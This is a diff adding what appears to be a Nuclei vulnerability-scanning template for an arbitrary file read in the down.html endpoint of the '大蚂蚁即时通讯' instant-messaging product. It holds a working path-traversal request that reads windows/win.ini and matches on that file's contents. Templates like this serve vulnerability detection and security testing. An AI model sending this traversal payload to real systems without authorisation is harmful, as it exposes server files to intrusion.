@@ -1,0 +1,23 @@
+id: jiulinkeji-down_html-File-reading
+
+info:
+  name: 杭州九麒科技 大蚂蚁即时通讯 down.html 任意文件读取漏洞
+  author: jiulinkeji
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /Api/Update/down.html?file=../../../../../../../../windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+        condition: and
+      - type: status
+        status: 
+          - 200
